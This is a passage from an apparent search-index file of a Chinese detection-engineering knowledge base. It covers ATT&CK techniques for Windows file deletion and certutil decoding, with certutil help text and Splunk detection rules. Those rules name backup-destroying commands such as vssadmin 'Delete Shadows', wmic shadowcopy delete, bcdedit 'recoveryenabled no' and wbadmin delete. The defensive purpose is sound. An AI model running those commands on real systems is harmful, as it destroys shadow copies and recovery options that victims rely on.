7fa4\u548c\u7cfb\u7edf\u7684\u5178\u578b\u4f7f\u7528\u65b9\u5f0f\u3002\u76d1\u89c6\u547d\u4ee4\u884c\u5220\u9664\u529f\u80fd\u4ee5\u53ca\u76f8\u5173\u4f7f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u6216\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u7684\u5220\u9664\u6587\u4ef6\u8fdb\u884c\u5173\u8054\uff0c\u53ef\u80fd\u4f1a\u5e2e\u52a9\u5b89\u5168\u4eba\u5458\u68c0\u6d4b\u5230\u6076\u610f\u6d3b\u52a8\u3002\u53e6\u4e00\u4e2a\u597d\u7684\u505a\u6cd5\u662f\u76d1\u89c6\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5f15\u5165\u7684\u4f01\u4e1a\u7f51\u7edc\u4e2d\u7cfb\u7edf\u4e0a\u5c1a\u672a\u5b58\u5728\u7684\u5df2\u77e5\u5220\u9664\u548c\u5b89\u5168\u5220\u9664\u5de5\u5177\u3002\u67d0\u4e9b\u76d1\u89c6\u5de5\u5177\u53ef\u80fd\u4f1a\u6536\u96c6\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4f46\u53ef\u80fd\u65e0\u6cd5\u6355\u83b7DEL\u547d\u4ee4\uff0c\u56e0\u4e3aDEL\u662fcmd.exe\u4e2d\u7684\u672c\u673a\u51fd\u6570\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#splunk","text":"index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image IN (\u201c*\\\\sdelete.exe\u201d , \u201c*\\\\vssadmin.exe\u201d , \u201c*\\\\wmic.exe\u201d , \u201c*\\\\bcdedit.exe\u201d , \u201c*\\\\wbadmin.exe\u201d)) index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\vssadmin.exe\u201d CommandLine=\u201d*Delete Shadows*\u201d) index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\wmic.exe\u201d CommandLine=\u201d*shadowcopy delete*\u201d) index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\bcdedit.exe\u201d CommandLine IN (\u201c*bootstatuspolicy ignoreallfailures*\u201d , \u201c*recoveryenabled no*\u201d)) index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\wbadmin.exe\u201d CommandLine=\u201d*Delete*\u201d)","title":"splunk\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_6","text":"\u5982\u679c\u4f60\u5bf9windows\u6709\u8db3\u591f\u591a\u7684\u4e86\u89e3\uff0c\u90a3\u4e48\u76f8\u4fe1\u4f60\u4e5f\u77e5\u9053\u5e94\u8be5\u5982\u4f55\u53bb\u7528Windows\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\u6b64\u7c7b\u653b\u51fb\u884c\u4e3a\uff0c\u6bd4\u5982\u4f9d\u97604688\u4e2d\u7684\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_7","text":"MITRE-ATT&CK-T1070-004 https://attack.mitre.org/techniques/T1070/004/ windows\u4f7f\u7528sdelete\u5b89\u5168\u7684\u5220\u9664\u6587\u4ef6 https://www.cnblogs.com/douzilink/p/13297433.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/","text":"T1140-win-\u53bb\u6df7\u6dc6/\u89e3\u7801\u6587\u4ef6\u6216\u4fe1\u606f \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u6df7\u6dc6\u6587\u4ef6\u6216\u4fe1\u606f\u6765\u9690\u85cf\u5165\u4fb5\u3002\u4ed6\u4eec\u53ef\u80fd\u9700\u8981\u5355\u72ec\u7684\u673a\u5236\u6765\u89e3\u7801\u6216\u6a21\u7cca\u5904\u7406\u8be5\u4fe1\u606f\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u4ed6\u4eec\u6253\u7b97\u5982\u4f55\u4f7f\u7528\u5b83\u3002\u8fd9\u6837\u505a\u7684\u65b9\u6cd5\u5305\u62ec\u5185\u7f6e\u6076\u610f\u8f6f\u4ef6\u529f\u80fd\u6216\u4f7f\u7528\u7cfb\u7edf\u4e0a\u5b58\u5728\u7684\u5b9e\u7528\u7a0b\u5e8f\u3002 \u7ecf\u5178\u7684\u4f8b\u5b50\u5c31\u662f\u4f7f\u7528certutil\u89e3\u7801\u5df2\u9690\u85cf\u5728\u8bc1\u4e66\u6587\u4ef6\u4e2d\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\uff0c\u53ef\u79fb\u690d\u53ef\u6267\u884c\u6587\u4ef6\u3002\u53e6\u4e00\u4e2a\u7ecf\u5178\u7684\u4f8b\u5b50\u662f\u4f7f\u7528Windowscopy /b\u547d\u4ee4\u5c06\u4e8c\u8fdb\u5236\u7247\u6bb5\u91cd\u7ec4\u4e3a\u6076\u610f\u6709\u6548\u8d1f\u8f7d\u3002 \u6709\u65f6\uff0c\u4f5c\u4e3a\u7528\u6237\u6267\u884c\u7684\u4e00\u90e8\u5206\uff0c\u53ef\u80fd\u9700\u8981\u6253\u5f00\u7528\u6237\u7684\u64cd\u4f5c\u4ee5\u5bf9\u5176\u8fdb\u884c\u53bb\u6a21\u7cca\u5316\u6216\u89e3\u5bc6\u64cd\u4f5c\u3002\u53ef\u80fd\u8fd8\u8981\u6c42\u7528\u6237\u8f93\u5165\u5bc6\u7801\u4ee5\u6253\u5f00\u7531\u653b\u51fb\u8005\u63d0\u4f9b\u7684\u53d7\u5bc6\u7801\u4fdd\u62a4\u7684\u538b\u7f29/\u52a0\u5bc6\u6587\u4ef6\u3002 \u6d4b\u8bd5\u6848\u4f8b Certutil.exe\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u7a0b\u5e8f\uff0c\u4f5c\u4e3a\u8bc1\u4e66\u670d\u52a1\u7684\u4e00\u90e8\u5206\u5b89\u88c5\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528Certutil.exe\u8f6c\u50a8\u548c\u663e\u793a\u8bc1\u4e66\u9881\u53d1\u673a\u6784\uff08CA\uff09\u914d\u7f6e\u4fe1\u606f\uff0c\u914d\u7f6e\u8bc1\u4e66\u670d\u52a1\uff0c\u5907\u4efd\u548c\u8fd8\u539fCA\u7ec4\u4ef6\uff0c\u4ee5\u53ca\u9a8c\u8bc1\u8bc1\u4e66\uff0c\u5bc6\u94a5\u5bf9\u548c\u8bc1\u4e66\u94fe\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows security windows sysmon \u6d4b\u8bd5\u590d\u73b0 \u7b80\u5355\u7684\u4ecb\u7ecd\u4e00\u4e0bCertutil \u5de5\u5177\u7684\u4f7f\u7528\u65b9\u6cd5 certutil/? \u52a8\u8bcd: -dump -- \u8f6c\u50a8\u914d\u7f6e\u4fe1\u606f\u6216\u6587\u4ef6 -dumpPFX -- \u8f6c\u50a8 PFX \u7ed3\u6784 -asn -- \u5206\u6790 ASN.1 \u6587\u4ef6 -decodehex -- \u89e3\u7801\u5341\u516d\u8fdb\u5236\u7f16\u7801\u7684\u6587\u4ef6 -decode -- \u89e3\u7801 Base64 \u7f16\u7801\u7684\u6587\u4ef6 -encode -- \u5c06\u6587\u4ef6\u7f16\u7801\u4e3a Base64 -deny -- \u62d2\u7edd\u6302\u8d77\u7684\u7533\u8bf7 -resubmit -- \u91cd\u65b0\u63d0\u4ea4\u6302\u8d77\u7684\u7533\u8bf7 -setattributes -- \u4e3a\u6302\u8d77\u7533\u8bf7\u8bbe\u7f6e\u5c5e\u6027 -setextension -- \u4e3a\u6302\u8d77\u7533\u8bf7\u8bbe\u7f6e\u6269\u5c55 -revoke -- \u540a\u9500\u8bc1\u4e66 -isvalid -- \u663e\u793a\u5f53\u524d\u8bc1\u4e66\u90e8\u7f72 -getconfig -- \u83b7\u53d6\u9ed8\u8ba4\u914d\u7f6e\u5b57\u7b26\u4e32 -ping -- Ping Active Directory \u8bc1\u4e66\u670d\u52a1\u7533\u8bf7\u63a5\u53e3 -pingadmin -- Ping Active Directory \u8bc1\u4e66\u670d\u52a1\u7ba1\u7406\u63a5\u53e3 -CAInfo -- \u663e\u793a CA \u4fe1\u606f -ca.cert -- \u68c0\u7d22 CA \u7684\u8bc1\u4e66 -ca.chain -- \u68c0\u7d22 CA \u7684\u8bc1\u4e66\u94fe -GetCRL -- \u83b7\u53d6 CRL -CRL -- \u53d1\u5e03\u65b0\u7684 CRL [\u6216\u4ec5\u589e\u91cf CRL] -shutdown -- \u5173\u95ed Active Directory \u8bc1\u4e66\u670d\u52a1 -installCert -- \u5b89\u88c5\u8bc1\u4e66\u9881\u53d1\u673a\u6784\u8bc1\u4e66 -renewCert -- \u7eed\u8ba2\u8bc1\u4e66\u9881\u53d1\u673a\u6784\u8bc1\u4e66 -schema -- \u8f6c\u50a8\u8bc1\u4e66\u67b6\u6784 -view -- \u8f6c\u50a8\u8bc1\u4e66\u89c6\u56fe -db -- \u8f6c\u50a8\u539f\u59cb\u6570\u636e\u5e93 -deleterow -- \u5220\u9664\u670d\u52a1\u5668\u6570\u636e\u5e93\u884c -backup -- \u5907\u4efd Active Directory \u8bc1\u4e66\u670d\u52a1 -backupDB -- \u5907\u4efd Active Directory \u8bc1\u4e66\u670d\u52a1\u6570\u636e\u5e93 -backupKey -- \u5907\u4efd Active Directory \u8bc1\u4e66\u670d\u52a1\u8bc1\u4e66\u548c\u79c1\u94a5 -restore -- \u8fd8\u539f Active Directory \u8bc1\u4e66\u670d\u52a1 -restoreDB -- \u8fd8\u539f Active Directory \u8bc1\u4e66\u670d\u52a1\u6570\u636e\u5e93 -restoreKey -- \u8fd8\u539f Active Directory \u8bc1\u4e66\u670d\u52a1\u8bc1\u4e66\u548c\u79c1\u94a5 -importPFX -- \u5bfc\u5165\u8bc1\u4e66\u548c\u79c1\u94a5 -dynamicfilelist -- \u663e\u793a\u52a8\u6001\u6587\u4ef6\u5217\u8868 -databaselocations -- \u663e\u793a\u6570\u636e\u5e93\u4f4d\u7f6e -hashfile -- \u901a\u8fc7\u6587\u4ef6\u751f\u6210\u5e76\u663e\u793a\u52a0\u5bc6\u54c8\u5e0c -store -- \u8f6c\u50a8\u8bc1\u4e66\u5b58\u50a8 -enumstore -- \u679a\u4e3e\u8bc1\u4e66\u5b58\u50a8 -addstore -- \u5c06\u8bc1\u4e66\u6dfb\u52a0\u5230\u5b58\u50a8 -delstore -- \u4ece\u5b58\u50a8\u5220\u9664\u8bc1\u4e66 -verifystore -- \u9a8c\u8bc1\u5b58\u50a8\u4e2d\u7684\u8bc1\u4e66 -repairstore -- \u4fee\u590d\u5bc6\u94a5\u5173\u8054\uff0c\u6216\u8005\u66f4\u65b0\u8bc1\u4e66\u5c5e\u6027\u6216\u5bc6\u94a5\u5b89\u5168\u63cf\u8ff0\u7b26 -viewstore -- \u8f6c\u50a8\u8bc1\u4e66\u5b58\u50a8 -viewdelstore -- \u4ece\u5b58\u50a8\u5220\u9664\u8bc1\u4e66 -UI -- \u8c03\u7528 CryptUI -attest -- \u9a8c\u8bc1\u5bc6\u94a5\u8bc1\u660e\u8bf7\u6c42 -dsPublish -- \u5c06\u8bc1\u4e66\u6216 CRL \u53d1\u5e03\u5230 Active Directory -ADTemplate -- \u663e\u793a AD \u6a21\u677f -Template -- \u663e\u793a\u6ce8\u518c\u7b56\u7565\u6a21\u677f -TemplateCAs -- \u663e\u793a\u6a21\u677f\u7684 CA -CATemplates -- \u663e\u793a CA \u7684\u6a21\u677f -SetCASites -- \u7ba1\u7406 CA \u7684\u7ad9\u70b9\u540d\u79f0 -enrollmentServerURL -- \u663e\u793a\u3001\u6dfb\u52a0\u6216\u5220\u9664\u4e0e CA \u5173\u8054\u7684\u6ce8\u518c\u670d\u52a1\u5668 URL -ADCA -- \u663e\u793a AD CA -CA -- \u663e\u793a\u6ce8\u518c\u7b56\u7565 CA -Policy -- \u663e\u793a\u6ce8\u518c\u7b56\u7565 -PolicyCache -- \u663e\u793a\u6216\u5220\u9664\u6ce8\u518c\u7b56\u7565\u7f13\u5b58\u9879\u76ee -CredStore -- \u663e\u793a\u3001\u6dfb\u52a0\u6216\u5220\u9664\u51ed\u636e\u5b58\u50a8\u9879\u76ee -InstallDefaultTemplates -- \u5b89\u88c5\u9ed8\u8ba4\u7684\u8bc1\u4e66\u6a21\u677f -URLCache -- \u663e\u793a\u6216\u5220\u9664 URL \u7f13\u5b58\u9879\u76ee -pulse -- \u4ee5\u8109\u51b2\u65b9\u5f0f\u6267\u884c\u81ea\u52a8\u6ce8\u518c\u4e8b\u4ef6\u6216 NGC \u4efb\u52a1 -MachineInfo -- \u663e\u793a Active Directory \u8ba1\u7b97\u673a\u5bf9\u8c61\u4fe1\u606f -DCInfo -- \u663e\u793a\u57df\u63a7\u5236\u5668\u4fe1\u606f -EntInfo -- \u663e\u793a\u4f01\u4e1a\u4fe1\u606f -TCAInfo -- \u663e\u793a CA \u4fe1\u606f -SCInfo -- \u663e\u793a\u667a\u80fd\u5361\u4fe1\u606f -SCRoots -- \u7ba1\u7406\u667a\u80fd\u5361\u6839\u8bc1\u4e66 -verifykeys -- \u9a8c\u8bc1\u516c/\u79c1\u94a5\u96c6 -verify -- \u9a8c\u8bc1\u8bc1\u4e66\uff0cCRL \u6216\u94fe -verifyCTL -- \u9a8c\u8bc1 AuthRoot \u6216\u4e0d\u5141\u8bb8\u7684\u8bc1\u4e66 CTL -syncWithWU -- \u4e0e Windows \u66f4\u65b0\u540c\u6b65 -generateSSTFromWU -- \u901a\u8fc7 Windows \u66f4\u65b0\u751f\u6210 SST -generatePinRulesCTL -- \u751f\u6210\u6346\u7ed1\u89c4\u5219 CTL -downloadOcsp -- \u4e0b\u8f7d OCSP \u54cd\u5e94\u5e76\u5199\u5165\u76ee\u5f55 -generateHpkpHeader -- \u4f7f\u7528\u6307\u5b9a\u6587\u4ef6\u6216\u76ee\u5f55\u4e2d\u7684\u8bc1\u4e66\u751f\u6210 HPKP \u5934 -flushCache -- \u5237\u65b0\u9009\u5b9a\u8fdb\u7a0b(\u4f8b\u5982 lsass.exe)\u4e2d\u7684\u6307\u5b9a\u7f13\u5b58 -addEccCurve -- \u6dfb\u52a0 ECC \u66f2\u7ebf -deleteEccCurve -- \u5220\u9664 ECC \u66f2\u7ebf -displayEccCurve -- \u663e\u793a ECC \u66f2\u7ebf -sign -- \u91cd\u65b0\u7b7e\u540d CRL \u6216\u8bc1\u4e66 -vroot -- \u521b\u5efa/\u5220\u9664 Web \u865a\u62df\u6839\u548c\u6587\u4ef6\u5171\u4eab -vocsproot -- \u521b\u5efa/\u5220\u9664 OCSP Web Proxy \u7684 Web \u865a\u62df\u6839 -addEnrollmentServer -- \u6dfb\u52a0\u6ce8\u518c\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f -deleteEnrollmentServer -- \u5220\u9664\u6ce8\u518c\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f -addPolicyServer -- \u6dfb\u52a0\u7b56\u7565\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f -deletePolicyServer -- \u5220\u9664\u7b56\u7565\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f -oid -- \u663e\u793a ObjectId \u6216\u8bbe\u7f6e\u663e\u793a\u540d\u79f0 -error -- \u663e\u793a\u9519\u8bef\u4ee3\u7801\u6d88\u606f\u6587\u672c -getreg -- \u663e\u793a\u6ce8\u518c\u8868\u503c -setreg -- \u8bbe\u7f6e\u6ce8\u518c\u8868\u503c -delreg -- \u5220\u9664\u6ce8\u518c\u8868\u503c -ImportKMS -- \u4e3a\u5bc6\u94a5\u5b58\u6863\u5bfc\u5165\u7528\u6237\u5bc6\u94a5\u548c\u8bc1\u4e66\u5230\u670d\u52a1\u5668\u6570\u636e\u5e93 -ImportCert -- \u5c06\u8bc1\u4e66\u6587\u4ef6\u5bfc\u5165\u6570\u636e\u5e93 -GetKey -- \u68c0\u7d22\u5b58\u6863\u7684\u79c1\u94a5\u6062\u590d Blob\uff0c\u751f\u6210\u6062\u590d\u811a\u672c \u6216\u6062\u590d\u5b58\u6863\u7684\u5bc6\u94a5 -RecoverKey -- \u6062\u590d\u5b58\u6863\u7684\u79c1\u94a5 -MergePFX -- \u5408\u5e76 PFX \u6587\u4ef6 -ConvertEPF -- \u5c06 PFX \u6587\u4ef6\u8f6c\u6362\u4e3a EPF \u6587\u4ef6 -add-chain -- (-AddChain) \u6dfb\u52a0\u8bc1\u4e66\u94fe -add-pre-chain -- (-AddPrechain) \u6dfb\u52a0\u9884\u690d\u8bc1\u4e66\u94fe -get-sth -- (-GetSTH) \u83b7\u53d6\u7b7e\u540d\u6811\u5934 -get-sth-consistency -- (-GetSTHConsistency) \u83b7\u53d6\u7b7e\u540d\u6811\u5934\u66f4\u6539 -get-proof-by-hash -- (-GetProofByHash) \u83b7\u53d6\u54c8\u5e0c\u8bc1\u660e -get-entries -- (-GetEntries) \u83b7\u53d6\u9879 -get-roots -- (-GetRoots) \u83b7\u53d6\u6839 -get-entry-and-proof -- (-GetEntryAndProof) \u83b7\u53d6\u9879\u548c\u8bc1\u660e -VerifyCT -- \u9a8c\u8bc1\u8bc1\u4e66 SCT -? -- \u663e\u793a\u8be5\u7528\u6cd5\u6d88\u606f CertUtil -? -- \u663e\u793a\u52a8\u8bcd\u5217\u8868(\u547d\u540d\u5217\u8868) CertUtil -dump -? -- \u663e\u793a \"dump\" \u52a8\u8bcd\u7684\u5e2e\u52a9\u6587\u672c CertUtil -v -? -- \u663e\u793a\u6240\u6709\u52a8\u8bcd\u7684\u6240\u6709\u5e2e\u52a9\u6587\u672c CertUtil: -? \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u6839\u636e\u5b9e\u73b0\u7684\u65b9\u6cd5\u4e0d\u540c\uff0c\u68c0\u6d4b\u53bb\u6df7\u6dc6\u6216\u89e3\u7801\u6587\u4ef6\u4fe1\u606f\u7684\u52a8\u4f5c\u53ef\u80fd\u5f88\u56f0\u96be\u3002\u5982\u679c\u8be5\u529f\u80fd\u5305\u542b\u5728\u6076\u610f\u8f6f\u4ef6\u4e2d\u5e76\u4f7f\u7528Windows API\uff0c\u5219\u4e0e\u5728\u52a0\u8f7d\u7684\u5e93\u6216API\u8c03\u7528\u4e0a\u8fdb\u884c\u5206\u6790\u76f8\u6bd4\uff0c\u5c1d\u8bd5\u5728\u64cd\u4f5c\u4e4b\u524d\u6216\u4e4b\u540e\u68c0\u6d4b\u6076\u610f\u884c\u4e3a\u53ef\u80fd\u4f1a\u4ea7\u751f\u66f4\u597d\u7684\u7ed3\u679c\u3002\u5982\u679c\u4f7f\u7528\u811a\u672c\uff0c\u5219\u53ef\u80fd\u9700\u8981\u6536\u96c6\u811a\u672c\u8fdb\u884c\u5206\u6790\u3002\u6267\u884c\u8fc7\u7a0b\u548c\u547d\u4ee4\u884c\u76d1\u89c6\uff0c\u4ee5\u68c0\u6d4b\u4e0e\u811a\u672c\u548c\u7cfb\u7edf\u5b9e\u7528\u7a0b\u5e8f\uff08\u5982certutil\uff09\u6709\u5173\u7684\u6f5c\u5728\u6076\u610f\u884c\u4e3a\u3002 \u76d1\u89c6\u5e38\u89c1\u5f52\u6863\u6587\u4ef6\u5e94\u7528\u7a0b\u5e8f\u548c\u6269\u5c55\u7684\u6267\u884c\u6587\u4ef6\u8def\u5f84\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4f8b\u5982Zip\u548cRAR\u5f52\u6863\u5de5\u5177\u7684\u6269\u5c55\uff0c\u5e76\u4e0e\u5176\u4ed6\u53ef\u7591\u884c\u4e3a\u76f8\u5173\u8054\uff0c\u4ee5\u51cf\u5c11\u6765\u81ea\u6b63\u5e38\u7528\u6237\u548c\u7ba1\u7406\u5458\u884c\u4e3a\u7684\u8bef\u62a5. splunk\u89c4\u5219 index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\certutil.exe\u201d CommandLine IN (\u201c*encode*\u201d , \u201c*decode*\u201d)) \u5efa\u8bae \u5982\u679c\u4f60\u5bf9windows\u6709\u8db3\u591f\u591a\u7684\u4e86\u89e3\uff0c\u90a3\u4e48\u76f8\u4fe1\u4f60\u4e5f\u77e5\u9053\u5e94\u8be5\u5982\u4f55\u53bb\u7528Windows\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\u6b64\u7c7b\u653b\u51fb\u884c\u4e3a\uff0c\u6bd4\u5982\u4f9d\u97604688\u4e2d\u7684\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1140 https://attack.mitre.org/techniques/T1140 CMD \u4e2dcertutil \u64cd\u4f5c\u547d\u4ee4 https://www.cnblogs.com/zeng-qh/p/10608522.html","title":"T1140-win-\u53bb\u6df7\u6dc6/\u89e3\u7801\u6587\u4ef6\u6216\u4fe1\u606f"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#t1140-win-","text":"","title":"T1140-win-\u53bb\u6df7\u6dc6/\u89e3\u7801\u6587\u4ef6\u6216\u4fe1\u606f"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u6df7\u6dc6\u6587\u4ef6\u6216\u4fe1\u606f\u6765\u9690\u85cf\u5165\u4fb5\u3002\u4ed6\u4eec\u53ef\u80fd\u9700\u8981\u5355\u72ec\u7684\u673a\u5236\u6765\u89e3\u7801\u6216\u6a21\u7cca\u5904\u7406\u8be5\u4fe1\u606f\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u4ed6\u4eec\u6253\u7b97\u5982\u4f55\u4f7f\u7528\u5b83\u3002\u8fd9\u6837\u505a\u7684\u65b9\u6cd5\u5305\u62ec\u5185\u7f6e\u6076\u610f\u8f6f\u4ef6\u529f\u80fd\u6216\u4f7f\u7528\u7cfb\u7edf\u4e0a\u5b58\u5728\u7684\u5b9e\u7528\u7a0b\u5e8f\u3002 \u7ecf\u5178\u7684\u4f8b\u5b50\u5c31\u662f\u4f7f\u7528certutil\u89e3\u7801\u5df2\u9690\u85cf\u5728\u8bc1\u4e66\u6587\u4ef6\u4e2d\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\uff0c\u53ef\u79fb\u690d\u53ef\u6267\u884c\u6587\u4ef6\u3002\u53e6\u4e00\u4e2a\u7ecf\u5178\u7684\u4f8b\u5b50\u662f\u4f7f\u7528Windowscopy /b\u547d\u4ee4\u5c06\u4e8c\u8fdb\u5236\u7247\u6bb5\u91cd\u7ec4\u4e3a\u6076\u610f\u6709\u6548\u8d1f\u8f7d\u3002 \u6709\u65f6\uff0c\u4f5c\u4e3a\u7528\u6237\u6267\u884c\u7684\u4e00\u90e8\u5206\uff0c\u53ef\u80fd\u9700\u8981\u6253\u5f00\u7528\u6237\u7684\u64cd\u4f5c\u4ee5\u5bf9\u5176\u8fdb\u884c\u53bb\u6a21\u7cca\u5316\u6216\u89e3\u5bc6\u64cd\u4f5c\u3002\u53ef\u80fd\u8fd8\u8981\u6c42\u7528\u6237\u8f93\u5165\u5bc6\u7801\u4ee5\u6253\u5f00\u7531\u653b\u51fb\u8005\u63d0\u4f9b\u7684\u53d7\u5bc6\u7801\u4fdd\u62a4\u7684\u538b\u7f29/\u52a0\u5bc6\u6587\u4ef6\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#_1","text":"Certutil.exe\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u7a0b\u5e8f\uff0c\u4f5c\u4e3a\u8bc1\u4e66\u670d\u52a1\u7684\u4e00\u90e8\u5206\u5b89\u88c5\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528Certutil.exe\u8f6c\u50a8\u548c\u663e\u793a\u8bc1\u4e66\u9881\u53d1\u673a\u6784\uff08CA\uff09\u914d\u7f6e\u4fe1\u606f\uff0c\u914d\u7f6e\u8bc1\u4e66\u670d\u52a1\uff0c\u5907\u4efd\u548c\u8fd8\u539fCA\u7ec4\u4ef6\uff0c\u4ee5\u53ca\u9a8c\u8bc1\u8bc1\u4e66\uff0c\u5bc6\u94a5\u5bf9\u548c\u8bc1\u4e66\u94fe\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#_2","text":"windows security windows sysmon","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#_3","text":"\u7b80\u5355\u7684\u4ecb\u7ecd\u4e00\u4e0bCertutil \u5de5\u5177\u7684\u4f7f\u7528\u65b9\u6cd5 certutil/? \u52a8\u8bcd: -dump -- \u8f6c\u50a8\u914d\u7f6e\u4fe1\u606f\u6216\u6587\u4ef6 -dumpPFX -- \u8f6c\u50a8 PFX \u7ed3\u6784 -asn -- \u5206\u6790 ASN.1 \u6587\u4ef6 -decodehex -- \u89e3\u7801\u5341\u516d\u8fdb\u5236\u7f16\u7801\u7684\u6587\u4ef6 -decode -- \u89e3\u7801 Base64 \u7f16\u7801\u7684\u6587\u4ef6 -encode -- \u5c06\u6587\u4ef6\u7f16\u7801\u4e3a Base64 -deny -- \u62d2\u7edd\u6302\u8d77\u7684\u7533\u8bf7 -resubmit -- \u91cd\u65b0\u63d0\u4ea4\u6302\u8d77\u7684\u7533\u8bf7 -setattributes -- \u4e3a\u6302\u8d77\u7533\u8bf7\u8bbe\u7f6e\u5c5e\u6027 -setextension -- \u4e3a\u6302\u8d77\u7533\u8bf7\u8bbe\u7f6e\u6269\u5c55 -revoke -- \u540a\u9500\u8bc1\u4e66 -isvalid -- \u663e\u793a\u5f53\u524d\u8bc1\u4e66\u90e8\u7f72 -getconfig -- \u83b7\u53d6\u9ed8\u8ba4\u914d\u7f6e\u5b57\u7b26\u4e32 -ping -- Ping Active Directory \u8bc1\u4e66\u670d\u52a1\u7533\u8bf7\u63a5\u53e3 -pingadmin -- Ping Active Directory \u8bc1\u4e66\u670d\u52a1\u7ba1\u7406\u63a5\u53e3 -CAInfo -- \u663e\u793a CA \u4fe1\u606f -ca.cert -- \u68c0\u7d22 CA \u7684\u8bc1\u4e66 -ca.chain -- \u68c0\u7d22 CA \u7684\u8bc1\u4e66\u94fe -GetCRL -- \u83b7\u53d6 CRL -CRL -- \u53d1\u5e03\u65b0\u7684 CRL [\u6216\u4ec5\u589e\u91cf CRL] -shutdown -- \u5173\u95ed Active Directory \u8bc1\u4e66\u670d\u52a1 -installCert -- \u5b89\u88c5\u8bc1\u4e66\u9881\u53d1\u673a\u6784\u8bc1\u4e66 -renewCert -- \u7eed\u8ba2\u8bc1\u4e66\u9881\u53d1\u673a\u6784\u8bc1\u4e66 -schema -- \u8f6c\u50a8\u8bc1\u4e66\u67b6\u6784 -view -- \u8f6c\u50a8\u8bc1\u4e66\u89c6\u56fe -db -- \u8f6c\u50a8\u539f\u59cb\u6570\u636e\u5e93 -deleterow -- \u5220\u9664\u670d\u52a1\u5668\u6570\u636e\u5e93\u884c -backup -- \u5907\u4efd Active Directory \u8bc1\u4e66\u670d\u52a1 -backupDB -- \u5907\u4efd Active Directory \u8bc1\u4e66\u670d\u52a1\u6570\u636e\u5e93 